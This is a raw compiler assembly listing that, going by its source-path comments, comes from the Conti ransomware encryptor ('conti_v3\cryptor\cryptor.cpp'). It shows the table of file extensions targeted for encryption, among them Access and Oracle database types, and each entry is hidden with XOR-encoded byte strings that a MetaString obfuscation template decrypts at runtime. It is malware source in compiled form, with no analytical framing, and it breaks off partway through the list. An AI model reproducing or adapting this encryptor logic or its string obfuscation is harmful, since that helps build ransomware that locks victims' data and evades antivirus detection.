	00 00		 lea	 rcx, QWORD PTR $T3[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000c4	c6 85 60 08 00
	00 00		 mov	 BYTE PTR $T3[rbp-256], 0
  000cb	c6 85 61 08 00
	00 01		 mov	 BYTE PTR $T3[rbp-255], 1
  000d2	c6 85 62 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-254], 3
  000d9	c6 85 63 08 00
	00 36		 mov	 BYTE PTR $T3[rbp-253], 54 ; 00000036H
  000e0	c6 85 64 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-252], 3
  000e7	c6 85 65 08 00
	00 4c		 mov	 BYTE PTR $T3[rbp-251], 76 ; 0000004cH
  000ee	c6 85 66 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-250], 3
  000f5	c6 85 67 08 00
	00 4c		 mov	 BYTE PTR $T3[rbp-249], 76 ; 0000004cH
  000fc	c6 85 68 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-248], 3
  00103	c6 85 69 08 00
	00 57		 mov	 BYTE PTR $T3[rbp-247], 87 ; 00000057H
  0010a	c6 85 6a 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-246], 3
  00111	c6 85 6b 08 00
	00 41		 mov	 BYTE PTR $T3[rbp-245], 65 ; 00000041H
  00118	c6 85 6c 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-244], 3
  0011f	c6 85 6d 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-243], 3
  00126	c6 85 6e 08 00
	00 03		 mov	 BYTE PTR $T3[rbp-242], 3
  0012d	0f b6 85 61 08
	00 00		 movzx	 eax, BYTE PTR $T3[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 296  : 		OBFW(L".accdb"),

  00134	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  00139	48 89 85 40 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-240], rax

; 297  : 		OBFW(L".accdc"),

  00140	48 8d 8d 70 08
	00 00		 lea	 rcx, QWORD PTR $T4[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00147	c6 85 70 08 00
	00 00		 mov	 BYTE PTR $T4[rbp-256], 0
  0014e	c6 85 71 08 00
	00 6c		 mov	 BYTE PTR $T4[rbp-255], 108 ; 0000006cH
  00155	c6 85 72 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-254], 40 ; 00000028H
  0015c	c6 85 73 08 00
	00 54		 mov	 BYTE PTR $T4[rbp-253], 84 ; 00000054H
  00163	c6 85 74 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-252], 40 ; 00000028H
  0016a	c6 85 75 08 00
	00 62		 mov	 BYTE PTR $T4[rbp-251], 98 ; 00000062H
  00171	c6 85 76 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-250], 40 ; 00000028H
  00178	c6 85 77 08 00
	00 62		 mov	 BYTE PTR $T4[rbp-249], 98 ; 00000062H
  0017f	c6 85 78 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-248], 40 ; 00000028H
  00186	c6 85 79 08 00
	00 69		 mov	 BYTE PTR $T4[rbp-247], 105 ; 00000069H
  0018d	c6 85 7a 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-246], 40 ; 00000028H
  00194	c6 85 7b 08 00
	00 62		 mov	 BYTE PTR $T4[rbp-245], 98 ; 00000062H
  0019b	c6 85 7c 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-244], 40 ; 00000028H
  001a2	c6 85 7d 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-243], 40 ; 00000028H
  001a9	c6 85 7e 08 00
	00 28		 mov	 BYTE PTR $T4[rbp-242], 40 ; 00000028H
  001b0	0f b6 85 71 08
	00 00		 movzx	 eax, BYTE PTR $T4[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 297  : 		OBFW(L".accdc"),

  001b7	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  001bc	48 89 85 48 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-232], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  001c3	c6 85 80 08 00
	00 00		 mov	 BYTE PTR $T5[rbp-256], 0
  001ca	c6 85 81 08 00
	00 71		 mov	 BYTE PTR $T5[rbp-255], 113 ; 00000071H
  001d1	c6 85 82 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-254], 21
  001d8	c6 85 83 08 00
	00 58		 mov	 BYTE PTR $T5[rbp-253], 88 ; 00000058H
  001df	c6 85 84 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-252], 21
  001e6	c6 85 85 08 00
	00 5c		 mov	 BYTE PTR $T5[rbp-251], 92 ; 0000005cH
  001ed	c6 85 86 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-250], 21
  001f4	c6 85 87 08 00
	00 5c		 mov	 BYTE PTR $T5[rbp-249], 92 ; 0000005cH
  001fb	c6 85 88 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-248], 21
  00202	c6 85 89 08 00
	00 5e		 mov	 BYTE PTR $T5[rbp-247], 94 ; 0000005eH
  00209	c6 85 8a 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-246], 21
  00210	c6 85 8b 08 00
	00 60		 mov	 BYTE PTR $T5[rbp-245], 96 ; 00000060H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00217	c6 85 8c 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-244], 21
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 298  : 		OBFW(L".accde"),

  0021e	48 8d 8d 80 08
	00 00		 lea	 rcx, QWORD PTR $T5[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00225	c6 85 8d 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-243], 21
  0022c	c6 85 8e 08 00
	00 15		 mov	 BYTE PTR $T5[rbp-242], 21
  00233	0f b6 85 81 08
	00 00		 movzx	 eax, BYTE PTR $T5[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 298  : 		OBFW(L".accde"),

  0023a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  0023f	48 89 85 50 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-224], rax

; 299  : 		OBFW(L".accdr"),

  00246	48 8d 8d 90 08
	00 00		 lea	 rcx, QWORD PTR $T6[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0024d	c6 85 90 08 00
	00 00		 mov	 BYTE PTR $T6[rbp-256], 0
  00254	c6 85 91 08 00
	00 4e		 mov	 BYTE PTR $T6[rbp-255], 78 ; 0000004eH
  0025b	c6 85 92 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-254], 114 ; 00000072H
  00262	c6 85 93 08 00
	00 10		 mov	 BYTE PTR $T6[rbp-253], 16
  00269	c6 85 94 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-252], 114 ; 00000072H
  00270	c6 85 95 08 00
	00 1f		 mov	 BYTE PTR $T6[rbp-251], 31
  00277	c6 85 96 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-250], 114 ; 00000072H
  0027e	c6 85 97 08 00
	00 1f		 mov	 BYTE PTR $T6[rbp-249], 31
  00285	c6 85 98 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-248], 114 ; 00000072H
  0028c	c6 85 99 08 00
	00 66		 mov	 BYTE PTR $T6[rbp-247], 102 ; 00000066H
  00293	c6 85 9a 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-246], 114 ; 00000072H
  0029a	c6 85 9b 08 00
	00 50		 mov	 BYTE PTR $T6[rbp-245], 80 ; 00000050H
  002a1	c6 85 9c 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-244], 114 ; 00000072H
  002a8	c6 85 9d 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-243], 114 ; 00000072H
  002af	c6 85 9e 08 00
	00 72		 mov	 BYTE PTR $T6[rbp-242], 114 ; 00000072H
  002b6	0f b6 85 91 08
	00 00		 movzx	 eax, BYTE PTR $T6[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 299  : 		OBFW(L".accdr"),

  002bd	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  002c2	48 89 85 58 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-216], rax

; 300  : 		OBFW(L".accdt"),

  002c9	48 8d 8d a0 08
	00 00		 lea	 rcx, QWORD PTR $T7[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  002d0	c6 85 a0 08 00
	00 00		 mov	 BYTE PTR $T7[rbp-256], 0
  002d7	c6 85 a1 08 00
	00 02		 mov	 BYTE PTR $T7[rbp-255], 2
  002de	c6 85 a2 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-254], 109 ; 0000006dH
  002e5	c6 85 a3 08 00
	00 6b		 mov	 BYTE PTR $T7[rbp-253], 107 ; 0000006bH
  002ec	c6 85 a4 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-252], 109 ; 0000006dH
  002f3	c6 85 a5 08 00
	00 0e		 mov	 BYTE PTR $T7[rbp-251], 14
  002fa	c6 85 a6 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-250], 109 ; 0000006dH
  00301	c6 85 a7 08 00
	00 0e		 mov	 BYTE PTR $T7[rbp-249], 14
  00308	c6 85 a8 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-248], 109 ; 0000006dH
  0030f	c6 85 a9 08 00
	00 1f		 mov	 BYTE PTR $T7[rbp-247], 31
  00316	c6 85 aa 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-246], 109 ; 0000006dH
  0031d	c6 85 ab 08 00
	00 31		 mov	 BYTE PTR $T7[rbp-245], 49 ; 00000031H
  00324	c6 85 ac 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-244], 109 ; 0000006dH
  0032b	c6 85 ad 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-243], 109 ; 0000006dH
  00332	c6 85 ae 08 00
	00 6d		 mov	 BYTE PTR $T7[rbp-242], 109 ; 0000006dH
  00339	0f b6 85 a1 08
	00 00		 movzx	 eax, BYTE PTR $T7[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 300  : 		OBFW(L".accdt"),

  00340	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  00345	48 89 85 60 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-208], rax

; 301  : 		OBFW(L".accft"),

  0034c	48 8d 8d b0 08
	00 00		 lea	 rcx, QWORD PTR $T8[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00353	c6 85 b0 08 00
	00 00		 mov	 BYTE PTR $T8[rbp-256], 0
  0035a	c6 85 b1 08 00
	00 49		 mov	 BYTE PTR $T8[rbp-255], 73 ; 00000049H
  00361	c6 85 b2 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-254], 48 ; 00000030H
  00368	c6 85 b3 08 00
	00 6d		 mov	 BYTE PTR $T8[rbp-253], 109 ; 0000006dH
  0036f	c6 85 b4 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-252], 48 ; 00000030H
  00376	c6 85 b5 08 00
	00 58		 mov	 BYTE PTR $T8[rbp-251], 88 ; 00000058H
  0037d	c6 85 b6 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-250], 48 ; 00000030H
  00384	c6 85 b7 08 00
	00 58		 mov	 BYTE PTR $T8[rbp-249], 88 ; 00000058H
  0038b	c6 85 b8 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-248], 48 ; 00000030H
  00392	c6 85 b9 08 00
	00 78		 mov	 BYTE PTR $T8[rbp-247], 120 ; 00000078H
  00399	c6 85 ba 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-246], 48 ; 00000030H
  003a0	c6 85 bb 08 00
	00 64		 mov	 BYTE PTR $T8[rbp-245], 100 ; 00000064H
  003a7	c6 85 bc 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-244], 48 ; 00000030H
  003ae	c6 85 bd 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-243], 48 ; 00000030H
  003b5	c6 85 be 08 00
	00 30		 mov	 BYTE PTR $T8[rbp-242], 48 ; 00000030H
  003bc	0f b6 85 b1 08
	00 00		 movzx	 eax, BYTE PTR $T8[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 301  : 		OBFW(L".accft"),

  003c3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<53,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  003c8	48 89 85 68 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-200], rax

; 302  : 		OBFW(L".adb"),

  003cf	48 8d 4d 80	 lea	 rcx, QWORD PTR $T9[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  003d3	c6 45 80 00	 mov	 BYTE PTR $T9[rbp-256], 0
  003d7	c6 45 81 6b	 mov	 BYTE PTR $T9[rbp-255], 107 ; 0000006bH
  003db	c6 45 82 63	 mov	 BYTE PTR $T9[rbp-254], 99 ; 00000063H
  003df	c6 45 83 16	 mov	 BYTE PTR $T9[rbp-253], 22
  003e3	c6 45 84 63	 mov	 BYTE PTR $T9[rbp-252], 99 ; 00000063H
  003e7	c6 45 85 11	 mov	 BYTE PTR $T9[rbp-251], 17
  003eb	c6 45 86 63	 mov	 BYTE PTR $T9[rbp-250], 99 ; 00000063H
  003ef	c6 45 87 69	 mov	 BYTE PTR $T9[rbp-249], 105 ; 00000069H
  003f3	c6 45 88 63	 mov	 BYTE PTR $T9[rbp-248], 99 ; 00000063H
  003f7	c6 45 89 63	 mov	 BYTE PTR $T9[rbp-247], 99 ; 00000063H
  003fb	c6 45 8a 63	 mov	 BYTE PTR $T9[rbp-246], 99 ; 00000063H
  003ff	0f b6 45 81	 movzx	 eax, BYTE PTR $T9[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 302  : 		OBFW(L".adb"),

  00403	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<83,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00408	48 89 85 70 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-192], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0040f	c6 45 90 00	 mov	 BYTE PTR $T10[rbp-256], 0
  00413	c6 45 91 03	 mov	 BYTE PTR $T10[rbp-255], 3

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00417	c6 45 92 34	 mov	 BYTE PTR $T10[rbp-254], 52 ; 00000034H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 303  : 		OBFW(L".ade"),

  0041b	48 8d 4d 90	 lea	 rcx, QWORD PTR $T10[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0041f	c6 45 93 5f	 mov	 BYTE PTR $T10[rbp-253], 95 ; 0000005fH
  00423	c6 45 94 34	 mov	 BYTE PTR $T10[rbp-252], 52 ; 00000034H
  00427	c6 45 95 4e	 mov	 BYTE PTR $T10[rbp-251], 78 ; 0000004eH
  0042b	c6 45 96 34	 mov	 BYTE PTR $T10[rbp-250], 52 ; 00000034H
  0042f	c6 45 97 1e	 mov	 BYTE PTR $T10[rbp-249], 30
  00433	c6 45 98 34	 mov	 BYTE PTR $T10[rbp-248], 52 ; 00000034H
  00437	c6 45 99 34	 mov	 BYTE PTR $T10[rbp-247], 52 ; 00000034H
  0043b	c6 45 9a 34	 mov	 BYTE PTR $T10[rbp-246], 52 ; 00000034H
  0043f	0f b6 45 91	 movzx	 eax, BYTE PTR $T10[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 303  : 		OBFW(L".ade"),

  00443	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00448	48 89 85 78 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-184], rax

; 304  : 		OBFW(L".adf"),

  0044f	48 8d 4d a0	 lea	 rcx, QWORD PTR $T11[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00453	c6 45 a0 00	 mov	 BYTE PTR $T11[rbp-256], 0
  00457	c6 45 a1 6d	 mov	 BYTE PTR $T11[rbp-255], 109 ; 0000006dH
  0045b	c6 45 a2 4b	 mov	 BYTE PTR $T11[rbp-254], 75 ; 0000004bH
  0045f	c6 45 a3 61	 mov	 BYTE PTR $T11[rbp-253], 97 ; 00000061H
  00463	c6 45 a4 4b	 mov	 BYTE PTR $T11[rbp-252], 75 ; 0000004bH
  00467	c6 45 a5 2c	 mov	 BYTE PTR $T11[rbp-251], 44 ; 0000002cH
  0046b	c6 45 a6 4b	 mov	 BYTE PTR $T11[rbp-250], 75 ; 0000004bH
  0046f	c6 45 a7 33	 mov	 BYTE PTR $T11[rbp-249], 51 ; 00000033H
  00473	c6 45 a8 4b	 mov	 BYTE PTR $T11[rbp-248], 75 ; 0000004bH
  00477	c6 45 a9 4b	 mov	 BYTE PTR $T11[rbp-247], 75 ; 0000004bH
  0047b	c6 45 aa 4b	 mov	 BYTE PTR $T11[rbp-246], 75 ; 0000004bH
  0047f	0f b6 45 a1	 movzx	 eax, BYTE PTR $T11[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 304  : 		OBFW(L".adf"),

  00483	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00488	48 89 85 80 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-176], rax

; 305  : 		OBFW(L".adp"),

  0048f	48 8d 4d b0	 lea	 rcx, QWORD PTR $T12[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00493	c6 45 b0 00	 mov	 BYTE PTR $T12[rbp-256], 0
  00497	c6 45 b1 45	 mov	 BYTE PTR $T12[rbp-255], 69 ; 00000045H
  0049b	c6 45 b2 54	 mov	 BYTE PTR $T12[rbp-254], 84 ; 00000054H
  0049f	c6 45 b3 16	 mov	 BYTE PTR $T12[rbp-253], 22
  004a3	c6 45 b4 54	 mov	 BYTE PTR $T12[rbp-252], 84 ; 00000054H
  004a7	c6 45 b5 4f	 mov	 BYTE PTR $T12[rbp-251], 79 ; 0000004fH
  004ab	c6 45 b6 54	 mov	 BYTE PTR $T12[rbp-250], 84 ; 00000054H
  004af	c6 45 b7 35	 mov	 BYTE PTR $T12[rbp-249], 53 ; 00000035H
  004b3	c6 45 b8 54	 mov	 BYTE PTR $T12[rbp-248], 84 ; 00000054H
  004b7	c6 45 b9 54	 mov	 BYTE PTR $T12[rbp-247], 84 ; 00000054H
  004bb	c6 45 ba 54	 mov	 BYTE PTR $T12[rbp-246], 84 ; 00000054H
  004bf	0f b6 45 b1	 movzx	 eax, BYTE PTR $T12[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 305  : 		OBFW(L".adp"),

  004c3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<19,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  004c8	48 89 85 88 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-168], rax

; 306  : 		OBFW(L".arc"),

  004cf	48 8d 4d c0	 lea	 rcx, QWORD PTR $T13[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  004d3	c6 45 c0 00	 mov	 BYTE PTR $T13[rbp-256], 0
  004d7	c6 45 c1 0b	 mov	 BYTE PTR $T13[rbp-255], 11
  004db	c6 45 c2 79	 mov	 BYTE PTR $T13[rbp-254], 121 ; 00000079H
  004df	c6 45 c3 05	 mov	 BYTE PTR $T13[rbp-253], 5
  004e3	c6 45 c4 79	 mov	 BYTE PTR $T13[rbp-252], 121 ; 00000079H
  004e7	c6 45 c5 03	 mov	 BYTE PTR $T13[rbp-251], 3
  004eb	c6 45 c6 79	 mov	 BYTE PTR $T13[rbp-250], 121 ; 00000079H
  004ef	c6 45 c7 48	 mov	 BYTE PTR $T13[rbp-249], 72 ; 00000048H
  004f3	c6 45 c8 79	 mov	 BYTE PTR $T13[rbp-248], 121 ; 00000079H
  004f7	c6 45 c9 79	 mov	 BYTE PTR $T13[rbp-247], 121 ; 00000079H
  004fb	c6 45 ca 79	 mov	 BYTE PTR $T13[rbp-246], 121 ; 00000079H
  004ff	0f b6 45 c1	 movzx	 eax, BYTE PTR $T13[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 306  : 		OBFW(L".arc"),

  00503	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00508	48 89 85 90 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-160], rax

; 307  : 		OBFW(L".ora"),

  0050f	48 8d 4d d0	 lea	 rcx, QWORD PTR $T14[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00513	c6 45 d0 00	 mov	 BYTE PTR $T14[rbp-256], 0
  00517	c6 45 d1 2b	 mov	 BYTE PTR $T14[rbp-255], 43 ; 0000002bH
  0051b	c6 45 d2 66	 mov	 BYTE PTR $T14[rbp-254], 102 ; 00000066H
  0051f	c6 45 d3 75	 mov	 BYTE PTR $T14[rbp-253], 117 ; 00000075H
  00523	c6 45 d4 66	 mov	 BYTE PTR $T14[rbp-252], 102 ; 00000066H
  00527	c6 45 d5 0b	 mov	 BYTE PTR $T14[rbp-251], 11
  0052b	c6 45 d6 66	 mov	 BYTE PTR $T14[rbp-250], 102 ; 00000066H
  0052f	c6 45 d7 13	 mov	 BYTE PTR $T14[rbp-249], 19
  00533	c6 45 d8 66	 mov	 BYTE PTR $T14[rbp-248], 102 ; 00000066H
  00537	c6 45 d9 66	 mov	 BYTE PTR $T14[rbp-247], 102 ; 00000066H
  0053b	c6 45 da 66	 mov	 BYTE PTR $T14[rbp-246], 102 ; 00000066H
  0053f	0f b6 45 d1	 movzx	 eax, BYTE PTR $T14[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 307  : 		OBFW(L".ora"),

  00543	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00548	48 89 85 98 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-152], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0054f	c6 45 e0 00	 mov	 BYTE PTR $T15[rbp-256], 0
  00553	c6 45 e1 62	 mov	 BYTE PTR $T15[rbp-255], 98 ; 00000062H
  00557	c6 45 e2 45	 mov	 BYTE PTR $T15[rbp-254], 69 ; 00000045H
  0055b	c6 45 e3 1c	 mov	 BYTE PTR $T15[rbp-253], 28
  0055f	c6 45 e4 45	 mov	 BYTE PTR $T15[rbp-252], 69 ; 00000045H
  00563	c6 45 e5 73	 mov	 BYTE PTR $T15[rbp-251], 115 ; 00000073H
  00567	c6 45 e6 45	 mov	 BYTE PTR $T15[rbp-250], 69 ; 00000045H
  0056b	c6 45 e7 38	 mov	 BYTE PTR $T15[rbp-249], 56 ; 00000038H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0056f	c6 45 e8 45	 mov	 BYTE PTR $T15[rbp-248], 69 ; 00000045H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 308  : 		OBFW(L".alf"),

  00573	48 8d 4d e0	 lea	 rcx, QWORD PTR $T15[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00577	c6 45 e9 45	 mov	 BYTE PTR $T15[rbp-247], 69 ; 00000045H
  0057b	c6 45 ea 45	 mov	 BYTE PTR $T15[rbp-246], 69 ; 00000045H
  0057f	0f b6 45 e1	 movzx	 eax, BYTE PTR $T15[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 308  : 		OBFW(L".alf"),

  00583	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<31,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00588	48 89 85 a0 0a
	00 00		 mov	 QWORD PTR Extensions$[rbp-144], rax

; 309  : 		OBFW(L".ask"),

  0058f	48 8d 4d f0	 lea	 rcx, QWORD PTR $T16[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00593	c6 45 f0 00	 mov	 BYTE PTR $T16[rbp-256], 0
  00597	c6 45 f1 01	 mov	 BYTE PTR $T16[rbp-255], 1
  0059b	c6 45 f2 40	 mov	 BYTE PTR $T16[rbp-254], 64 ; 00000040H
  0059f	c6 45 f3 53	 mov	 BYTE PTR $T16[rbp-253], 83 ; 00000053H
  005a3	c6 45 f4 40	 mov	 BYTE PTR $T16[rbp-252], 64 ; 00000040H
  005a7	c6 45 f5 61	 mov	 BYTE PTR $T16[rbp-251], 97 ; 00000061H
  005ab	c6 45 f6 40	 mov	 BYTE PTR $T16[rbp-250], 64 ; 00000040H
  005af	c6 45 f7 77	 mov	 BYTE PTR $T16[rbp-249], 119 ; 00000077H
  005b3	c6 45 f8 40	 mov	 BYTE PTR $T16[rbp-248], 64 ; 00000040H
  005b7	c6 45 f9 40	 mov	 BYTE PTR $T16[rbp-247], 64 ; 00000040H
